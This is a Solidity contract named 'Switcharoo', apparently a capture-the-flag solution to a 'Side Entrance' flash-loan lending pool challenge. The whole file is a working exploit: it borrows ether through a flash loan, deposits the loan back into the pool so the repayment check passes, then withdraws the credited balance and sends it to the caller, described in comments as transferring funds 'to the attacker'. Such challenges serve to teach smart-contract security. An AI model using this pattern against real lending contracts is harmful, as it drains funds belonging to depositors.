pragma solidity ^0.6.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract Switcharoo is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    receive() external payable {}

    constructor(address payable poolAddress) public {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function steal(uint256 amount) external {
        pool.flashLoan(amount);
        // after flashloan is complete
        // widthdraw and transfer to the attacker
        pool.withdraw();
        msg.sender.send(amount);
    }

    // this will be called by the pool during flashLoan()
    function execute() external override payable {
        // deposit recieved flash loan back into pool
        // this passes the desposit retuned check
        pool.deposit{value: msg.value}();
    }
}
